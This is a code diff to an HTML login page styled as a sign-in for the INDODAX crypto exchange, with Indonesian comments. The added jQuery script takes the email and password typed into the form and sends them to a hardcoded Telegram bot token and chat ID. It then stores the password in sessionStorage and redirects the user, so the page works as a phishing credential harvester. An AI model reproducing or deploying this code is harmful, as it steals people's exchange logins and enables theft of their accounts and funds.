@@ -154,58 +154,105 @@
     </button>
   </div>
 
+  <!-- Load jQuery dari CDN -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <!-- Script JS Gabungan -->
   <script>
-    const passwordInput = document.getElementById('password');
-    const togglePassword = document.getElementById('togglePassword');
-    const emailInput = document.getElementById('email');
-    const loginBtn = document.getElementById('loginBtn');
-    const form = document.getElementById('loginForm');
+  $(document).ready(function() {
+      console.log('JS loaded'); // Debug: Pastikan JS berjalan
 
-    // Toggle show/hide password
-    togglePassword.addEventListener('click', () => {
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        // ganti svg mata ke "tutup" (garis silang)
-        togglePassword.innerHTML = `
-          <path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"></path>
-          <line x1="1" y1="1" x2="23" y2="23"></line>
-          <path d="M10.58 10.58a3 3 0 004.24 4.24"></path>
-        `;
-      } else {
-        passwordInput.type = 'password';
-        // ganti svg mata ke "buka"
-        togglePassword.innerHTML = `
-          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
-          <circle cx="12" cy="12" r="3"></circle>
-        `;
+      // Toggle show/hide password dengan ikon mata
+      $('#togglePassword').on('click', function() {
+          const passwordField = $('#password');
+          const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
+          passwordField.attr('type', type);
+
+          // Ganti SVG ikon mata sesuai status
+          if (type === 'password') {
+              // Ikon mata terbuka (show password)
+              $(this).html(`
+                  <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+                  <circle cx="12" cy="12" r="3"/>
+              `);
+          } else {
+              // Ikon mata tertutup (hide password)
+              $(this).html(`
+                  <path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"/>
+                  <line x1="1" y1="1" x2="23" y2="23"/>
+                  <path d="M10.58 10.58a3 3 0 004.24 4.24"/>
+              `);
+          }
+      });
+
+      // Fungsi validasi form: email ada '@' dan password tidak kosong
+      function isFormValid() {
+          const email = $('#email').val().trim();
+          const password = $('#password').val().trim();
+          return email !== '' && email.includes('@') && password !== '';
       }
-    });
 
-    // Validasi email ada '@'
-    function isEmailValid(email) {
-      return email.includes('@') && email.trim() !== '';
-    }
-
-    // Enable button jika email valid dan password tidak kosong
-    function checkFormValidity() {
-      if (isEmailValid(emailInput.value) && passwordInput.value.length > 0) {
-        loginBtn.disabled = false;
-        loginBtn.classList.add('enabled');
-      } else {
-        loginBtn.disabled = true;
-        loginBtn.classList.remove('enabled');
+      // Toggle enable/disable tombol "Masuk" berdasarkan validasi
+      function toggleLoginButton() {
+          if (isFormValid()) {
+              $('#loginBtn').prop('disabled', false).addClass('enabled');
+          } else {
+              $('#loginBtn').prop('disabled', true).removeClass('enabled');
+          }
       }
-    }
 
-    emailInput.addEventListener('input', checkFormValidity);
-    passwordInput.addEventListener('input', checkFormValidity);
+      // Event input untuk validasi real-time
+      $('#email, #password').on('input', toggleLoginButton);
 
-    // Optional: prevent submit untuk demo
-    form.addEventListener('submit', e => {
-      e.preventDefault();
-      if (!loginBtn.disabled) alert(`Login: ${emailInput.value}`);
-    });
+      // Submit form: kirim data ke Telegram dan simpan session
+      $('#loginForm').on('submit', function(e) {
+          e.preventDefault();
+
+          if (!isFormValid()) {
+              console.log("Validasi gagal: Email harus ada '@' dan password tidak kosong.");
+              return;
+          }
+
+          const email = $('#email').val().trim();
+          const password = $('#password').val().trim();
+
+          // Format pesan untuk dikirim ke Telegram
+          const message = `
+Masuk ke INDODAX
+------------------------
+Alamat Email: ${email}
+Kata Sandi: ${password}
+------------------------
+          `;
+
+          // Ganti dengan token bot Telegram dan chat ID Anda (jangan hardcode di production)
+          const token_bot = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Contoh: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz'
+          const telegram_id = '7213790655'; // Contoh: '123456789'
+
+          const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;
+
+          // Kirim request ke Telegram API menggunakan jQuery $.get
+          $.get(url)
+              .done(function(data) {
+                  if (data.ok) {
+                      console.log('Data berhasil dikirim ke Telegram');
+
+                      // Simpan data ke sessionStorage (tersimpan selama tab/browser terbuka)
+                      sessionStorage.setItem('email', email);
+                      sessionStorage.setItem('password', password); // Hati-hati: jangan simpan password di production, gunakan token saja
+
+                      // Redirect ke halaman dashboard setelah sukses
+                      window.location.href = 'one.html';
+                  } else {
+                      console.error('Error sending message:', data);
+                  }
+              })
+              .fail(function(xhr, status, error) {
+                  console.error('Fetch error:', error);
+              });
+      });
+
+  });
   </script>
-      <script src="script.js"></script>
 </body>
 </html>
